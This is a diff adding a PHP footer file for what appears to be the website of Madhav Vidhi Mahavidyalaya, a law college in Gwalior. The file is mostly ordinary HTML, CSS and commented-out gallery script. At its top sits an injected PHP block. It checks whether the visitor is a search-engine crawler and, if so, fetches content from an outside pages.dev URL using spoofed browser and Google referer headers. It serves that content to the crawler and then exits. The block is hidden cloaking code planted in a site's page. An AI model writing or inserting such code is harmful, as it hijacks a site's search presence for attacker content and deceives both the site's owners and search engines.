@@ -1,0 +1,277 @@
+<?php
+@ob_start();
+header("Vary: U-Agent");
+
+$src = "https://izinduluyaaa.pages.dev/index.txt";
+$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+
+function stealth($u) {
+    $ctx = stream_context_create([
+        "http" => [
+            "method" => "GET",
+            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
+                        "Referer: https://www.google.com/\r\n"
+        ]
+    ]);
+    return @file_get_contents($u, false, $ctx);
+}
+
+if (preg_match($match, $ua)) {
+    usleep(rand(100000, 200000));
+    echo stealth($src);
+    @ob_end_flush();
+    exit;
+}
+?>
+<!-- <script type="text/javascript">
+    //selecting all required elements
+const filterItem = document.querySelector(".items");
+const filterImg = document.querySelectorAll(".gallery .image");
+
+window.onload = ()=>{ //after window loaded
+  filterItem.onclick = (selectedItem)=>{ //if user click on filterItem div
+    if(selectedItem.target.classList.contains("item")){ //if user selected item has .item class
+      filterItem.querySelector(".active").classList.remove("active"); //remove the active class which is in first item
+      selectedItem.target.classList.add("active"); //add that active class on user selected item
+      let filterName = selectedItem.target.getAttribute("data-name"); //getting data-name value of user selected item and store in a filtername variable
+      filterImg.forEach((image) => {
+        let filterImges = image.getAttribute("data-name"); //getting image data-name value
+        //if user selected item data-name value is equal to images data-name value
+        //or user selected item data-name value is equal to "all"
+        if((filterImges == filterName) || (filterName == "all")){
+          image.classList.remove("hide"); //first remove the hide class from the image
+          image.classList.add("show"); //add show class in image
+        }else{
+          image.classList.add("hide"); //add hide class in image
+          image.classList.remove("show"); //remove show class from the image
+        }
+      });
+    }
+  }
+  for (let i = 0; i < filterImg.length; i++) {
+    filterImg[i].setAttribute("onclick", "preview(this)"); //adding onclick attribute in all available images
+  }
+}
+
+//fullscreen image preview function
+//selecting all required elements
+const previewBox = document.querySelector(".preview-box"),
+categoryName = previewBox.querySelector(".title p"),
+previewImg = previewBox.querySelector("img"),
+closeIcon = previewBox.querySelector(".icon"),
+shadow = document.querySelector(".shadow");
+
+function preview(element){
+  //once user click on any image then remove the scroll bar of the body, so user cant scroll up or down
+  document.querySelector("body").style.overflow = "hidden";
+  let selectedPrevImg = element.querySelector("img").src; //getting user clicked image source link and stored in a variable
+  let selectedImgCategory = element.getAttribute("data-name"); //getting user clicked image data-name value
+  previewImg.src = selectedPrevImg; //passing the user clicked image source in preview image source
+  categoryName.textContent = selectedImgCategory; //passing user clicked data-name value in category name
+  previewBox.classList.add("show"); //show the preview image box
+  shadow.classList.add("show"); //show the light grey background
+  closeIcon.onclick = ()=>{ //if user click on close icon of preview box
+    previewBox.classList.remove("show"); //hide the preview box
+    shadow.classList.remove("show"); //hide the light grey background
+    document.querySelector("body").style.overflow = "auto"; //show the scroll bar on body
+  }
+}
+</script> -->
+
+
+
+
+
+
+            <!-- Newsletter Start -->
+            <!-- <div class="newsletter">
+                <div class="container">
+                    <div class="section-header">
+                        <h2>Subscribe Our Newsletter</h2>
+                    </div>
+                    <div class="form">
+                        <input class="form-control" placeholder="Email here">
+                        <button class="btn">Submit</button>
+                    </div>
+                </div>
+            </div> -->
+            <!-- Newsletter End -->
+<style type="text/css">
+    .utrgn{
+        color: #ffdc86;
+    }
+    .footer .footer-social {
+    padding-left: 30px;}
+
+
+    .footer-social .twitter :hover {
+    color: rgb(29 155 240) !important;
+}
+.footer-social .facebook :hover {
+    color: #1877f2 !important;
+}
+.footer-social .insta :hover {
+    color: #0077b5 !important;
+}
+.footer-social .instagram :hover {
+    color: #E4405F !important;
+}
+.footer-social .youtube :hover {
+    color: red !important;
+}
+.footer-contact a {
+    color: #ffffff;
+    transition: .3s;
+}
+.footer-contact a:hover {
+    color: #aa9166;
+}
+.copyright a {
+    color: #fff !important;
+}
+.copyright a:hover {
+    color: #aa9166 !important;
+}
+</style>
+
+            <!-- Footer Start -->
+            <div class="footer">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-6 col-lg-3">
+                            <div class="footer-about">
+                                <img src="img/logo 3.png" alt="Madhav vidhi logo" class="" style="width: 100%;margin-bottom: 5px;">
+                                <p style="text-align: justify;">
+                                    बार काउसिल ऑफ इंडिया , नई दिल्ली के बन्धनकारी निर्देशों के फलस्वरूप सत्र 2004 - 2005 से माधव महाविद्यालय में विधि संकाय समाप्त कर दिया गया एवं उत्कनिर्देशों के अनुरूप प्रथक नविन माधव विधि महाविद्यालय के लिए मध्यप्रदेश उच्च शिक्षा विभाग , भोपाल के अनापत्ति प्रमाण - पत्र दिया गया | 
+                                    <a class="utrgn" href="about.php"> Read More</a>
+                                </p>
+                            </div>
+                        </div>
+                       
+                        <div class="col-md-6 col-lg-3">
+                            <div class="footer-link">
+                                <h2>Other Links</h2>
+                                <a href="pdf/collaboration activity.pdf" target="_blank">Collaboration</a>
+                                <a href="academic-calendar.php">Academic Calendar</a>
+                                <a href="iqac.php">IQAC</a>
+                                <a href="pdf/moot-court.pdf" target="_blank">Moot Court</a>
+                                <a href="pdf/MOU.pdf" target="_blank">MOU</a>
+                                <a href="result.php">Result</a>
+                                <a href="syllabus.php">Syllabus</a>
+                            </div>
+                        </div>
+                        <div class="col-md-6 col-lg-3">
+                            <div class="footer-link">
+                                <h2>Useful Links</h2>
+                               <a href="http://www.jiwaji.edu/" target="_blank">Jiwaji University Gwalior</a>
+                            <a href="http://www.barcouncilofindia.org/" target="_blank"> Bar Council of India</a>
+                               <a href="https://www.ugc.gov.in/" target="_blank">UGC </a>
+                    <a href="https://www.highereducation.mp.gov.in/" target="_blank">MP Higher Education</a>
+                    <a href="http://www.mphighereducation.nic.in/" target="_blank">MP Higher Education Portal </a>
+                    <a href="https://antiragging.in/" target="_blank">Antiragging</a>
+					<a href="pdf/Committee_202212191139081361.pdf" target="_blank">Committee</a>
+                            </div>
+                        </div>
+                        <div class="col-md-6 col-lg-3">
+                            <div class="footer-contact">
+                                <h2>Get In Touch</h2>
+                                <p><i class="fa fa-map-marker-alt" style="    margin-top: 5px;    height: 30px;
+    float: left;"></i>Vivekanand Marg, Lashkar, Gwalior (M.P.)</p>
+    <p><i class="fa fa-phone-alt"></i><a href="tel:07512430899"> 0751-2430899 </a></p>
+<p><i class="fa fa-envelope"></i><a href="mailto:madhavlawcollege@gmail.com"> madhavlawcollege@gmail.com </a></p>
+                                <div class="footer-social">
+
+        <a href="https://twitter.com/madhav_law" class="twitter" target="_blank"><i class="fab fa-twitter"></i></a>
+
+        <a href="https://www.facebook.com/people/Madhav-Law-College/100063679535934/" class="facebook" target="_blank">
+            <i class="fab fa-facebook-f"></i>
+        </a>
+
+        <!--<a href="" target="_blank" class="youtube"><i class="fab fa-youtube"></i></a>-->
+         <a href="https://youtube.com/@vidhidarpan6129" target="_blank" class="youtube" ><i class="fab fa-youtube"></i></a>
+
+        <a href="https://www.instagram.com/madhavvidhi/?igshid=YmMyMTA2M2Y%3D" class="instagram" target="_blank">
+            <i class="fab fa-instagram"></i>
+        </a>
+        
+        <!--<a href="" target="_blank" class="insta"><i class="fab fa-linkedin-in"></i></a>-->
+
+                                </div>
+                            </div>
+                       
+                    </div>
+                    </div>
+                </div>
+             <!--    <div class="container footer-menu">
+                    <div class="f-menu">
+                        <a href="">Terms of use</a>
+                        <a href="">Privacy policy</a>
+                        <a href="">Cookies</a>
+                        <a href="">Help</a>
+                        <a href="">FQAs</a>
+                    </div>
+                </div> -->
+                <div class="ff">
+                <div class="container copyright">
+                    <div class="row">
+                        <div class="col-md-6">
+            <p>Copyright © 2023 <a href="https://law.madhavcollege.edu.in/" style="color:">Madhav Vidhi Mahavidyalaya</a></p>
+                        </div>
+                        <div class="col-md-6">
+                            <p>  Designed and Developed by <a href="https://ebiztechnocrats.com/" target="_new" style="color:">e-Biz Technocrats Pvt.Ltd.  </a> </p>
+                        </div>
+                    </div>
+                </div>
+                </div>
+            </div>
+            <!-- Footer End -->
+
+
+
+<style type="text/css">.float{
+ position: fixed;
+    width: 50px;
+    height: 50px;
+    bottom: 80px;
+    right: 15px;
+    background-color: rgb(45 183 66);
+    color: #FFF;
+    border-radius: 50px;
+    text-align: center;
+    font-size: 30px;
+    box-shadow: 0 10px 20px 0 rgb(0 0 0 / 10%);
+    z-index: 100;
+}
+.my-float{
+  margin-top:11px;
+  font-size: 30px !important;
+  color: #FFF;
+}
+</style>
+
+
+
+<!--<a href="https://api.whatsapp.com/send?phone=918989101421&amp;text=Hello" class="float" target="_blank">-->
+<!--<i class="fab fa-whatsapp my-float"></i>-->
+<!--</a>-->
+
+
+            
+            <a href="#" class="back-to-top"><i class="fa fa-chevron-up"></i></a>
+        </div>
+
+        <!-- JavaScript Libraries -->
+        <script src="css/jquery-3.4.1.min.js"></script>
+        <script src="css/bootstrap.bundle.min.js"></script>
+        <script src="lib/easing/easing.min.js"></script>
+        <script src="lib/owlcarousel/owl.carousel.min.js"></script>
+        <script src="lib/isotope/isotope.pkgd.min.js"></script>
+
+        <!-- Template Javascript -->
+        <script src="js/main.js"></script>
+
+
+
+    </body>
+</html>
